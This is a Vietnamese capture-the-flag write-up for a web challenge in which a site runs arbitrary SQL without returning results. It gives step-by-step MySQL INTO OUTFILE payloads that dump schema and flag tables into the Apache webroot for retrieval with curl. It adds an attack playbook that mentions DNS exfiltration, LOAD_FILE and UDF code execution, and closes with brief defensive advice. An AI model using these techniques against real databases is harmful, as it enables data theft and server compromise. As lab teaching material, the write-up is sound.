# sqli-outfile-dump

- **Category:** Web
- **File đề:** Đề online, không có file kèm. Môi trường: website `http://target3/` có một ô nhập SQL tự do. Người chơi được cấp 2 máy (một Windows, một Ubuntu Linux) để làm attack-box; thông tin đăng nhập cụ thể trong PDF đã (REDACTED) *(chú thích: PDF gốc có kèm tên nền tảng/giải và mật khẩu mẫu — lược bỏ theo quy tắc trung tính)*.

## Tóm tắt đề
Website cho một ô nhập và một nút "Execute": server sẽ **chạy bất kỳ câu lệnh SQL nào** ta gõ vào, nhưng **không trả bảng kết quả** — chỉ hiện "success" hoặc "error". Nhiệm vụ là trích (exfiltrate) nội dung cơ sở dữ liệu phía sau, cụ thể là lấy flag nằm trong một bảng nào đó.

## Phân tích (chi tiết: hằng số/offset/payload/khóa thật)
Tình huống này là **"SQL execution mù" (blind SQL execution)**: ta điều khiển 100% câu truy vấn nhưng kênh hiển thị không trả về dữ liệu của `SELECT`. Vì vậy phải tự tạo một **kênh bên (out-of-band channel)** để chuyển dữ liệu ra ngoài.

Các dữ kiện load-bearing:
- **Backend = MySQL/MariaDB.** Xác nhận bằng cú pháp đặc trưng (ví dụ chạy được `SELECT @@version;`, comment `#`, hàm `SLEEP()`...).
- **Web server = Apache**, webroot mặc định `/var/www/html` — thư mục phục vụ file tĩnh qua HTTP.
- MySQL hỗ trợ `SELECT ... INTO OUTFILE '<path>'`, ghi kết quả query ra một file trên đĩa server. Điều kiện để hoạt động:
  1. Tài khoản MySQL phải có quyền **`FILE`**.
  2. Biến hệ thống **`secure_file_priv`** phải rỗng (`''`) hoặc trỏ tới thư mục ghi được. Nếu `secure_file_priv` trỏ tới một thư mục cố định thì chỉ ghi được trong đó; nếu là `NULL` thì cấm hẳn.

Lỗ hổng cốt lõi = **cấu hình sai `secure_file_priv` + tài khoản DB có quyền FILE**. Khi hai điều kiện này thỏa, ta có thể **ghi kết quả SELECT thành file ngay trong webroot của Apache**, rồi tải file đó qua HTTP để đọc. Chính web server tĩnh trở thành kênh exfiltration.

Đường dẫn/khóa thật dùng trong lời giải:
- File schema tạm: `/var/www/html/sch.txt` → đọc qua `http://target3/sch.txt`.
- Bảng chứa flag: **`mydb.flag`** (phát hiện khi đọc `INFORMATION_SCHEMA.TABLES`).
- File dump flag: `/var/www/html/flag.txt` → đọc qua `http://target3/flag.txt`.

## Kỹ thuật áp dụng (+ VÌ SAO nhận ra)
- **MySQL `INTO OUTFILE` → file write → exfiltration qua HTTP.**
- **VÌ SAO nhận ra:** đề cho chạy query tùy ý nhưng **không trả bảng** (chỉ success/error). Đây là dấu hiệu kinh điển cần nghĩ tới out-of-band. Khi đã biết DB là MySQL và webroot Apache là `/var/www/html`, con đường tự nhiên nhất để "chuyển" dữ liệu ra là ghi file vào webroot rồi tải qua HTTP — vì đó là nơi vừa ghi được (bằng SQL) vừa đọc lại được (bằng trình duyệt).
- **Công cụ:** chỉ cần chính form SQL của site + trình duyệt hoặc `curl`. Không cần sqlmap, nhưng sqlmap `--file-write`/`--sql-query` cũng làm được.

## Lời giải chi tiết (bước + code/lệnh/payload sạch, chạy lại được)
1. **Fingerprint DB + kiểm tra điều kiện.** Chạy trên form:
   ```sql
   SELECT @@version;                 -- xác nhận MySQL/MariaDB
   SELECT @@secure_file_priv;        -- '' hoặc thư mục cho phép ghi
   ```
   Nếu `@@secure_file_priv` rỗng → ghi được bất cứ đâu Apache đọc được.

2. **Dump toàn bộ danh sách bảng ra webroot** để lập bản đồ DB:
   ```sql
   SELECT table_schema, table_name
   FROM INFORMATION_SCHEMA.TABLES
   INTO OUTFILE '/var/www/html/sch.txt';
   ```

3. **Đọc file schema** vừa ghi:
   ```bash
   curl http://target3/sch.txt
   ```
   Trong danh sách, chú ý bảng đáng ngờ: **`mydb.flag`**.

4. **Dump nội dung bảng flag** ra webroot:
   ```sql
   SELECT * FROM mydb.flag
   INTO OUTFILE '/var/www/html/flag.txt';
   ```

5. **Tải file để lấy flag:**
   ```bash
   curl http://target3/flag.txt
   ```

Lưu ý: `INTO OUTFILE` **không ghi đè** file đã tồn tại → nếu chạy lại phải đổi tên file mới (`sch2.txt`, `flag2.txt`...).

## Flag
flag{MustC0nfigure-secure-file-priv}

*(Nguồn canonical `SOLUTIONS_VN.md` — bài #30; flag đã được nêu trong writeup đề.)*

## Gặp lại thì xử lý thế nào (playbook)
- **Dấu hiệu nhận diện:** chạy được query nhưng chỉ nhận "success/error" hoặc true/false, không thấy bảng → blind/no-result SQL execution. Nghĩ ngay tới kênh out-of-band.
- **Quy trình MySQL file-write:**
  1. Fingerprint: `@@version`, `@@secure_file_priv`. Rỗng → ghi mọi nơi; trỏ thư mục → chỉ ghi trong đó; `NULL` → không ghi được.
  2. Chọn thư mục vừa ghi được vừa đọc lại được qua kênh khác — kinh điển là webroot (`/var/www/html`, `/usr/share/nginx/html`).
  3. `SELECT ... INTO OUTFILE '<webroot>/x.txt'` rồi tải `http://host/x.txt`.
  4. Dump `INFORMATION_SCHEMA.TABLES`/`COLUMNS` trước để lập bản đồ, rồi dump bảng mục tiêu.
- **Kênh OOB khác khi không có web server đọc lại được:** DNS exfil (`LOAD_FILE` + UNC path trên Windows), `LOAD_FILE` để đọc file, UDF để RCE.
- **Bẫy thường gặp:** `secure_file_priv` set chặt; thiếu quyền `FILE`; `INTO OUTFILE` không ghi đè (đổi tên mỗi lần); đường dẫn phải là nơi web server phục vụ tĩnh.
- **Checklist:** [ ] blind? [ ] DB = MySQL? [ ] `@@secure_file_priv` rỗng/cho phép? [ ] biết webroot? [ ] ghi `INTO OUTFILE` [ ] tải qua HTTP [ ] dump schema → bảng flag.
- **Phòng thủ:** đặt `secure_file_priv` trỏ thư mục riêng hoặc `NULL`; thu hồi quyền `FILE`; không cho web app chạy SQL tùy ý bằng tài khoản quyền cao.
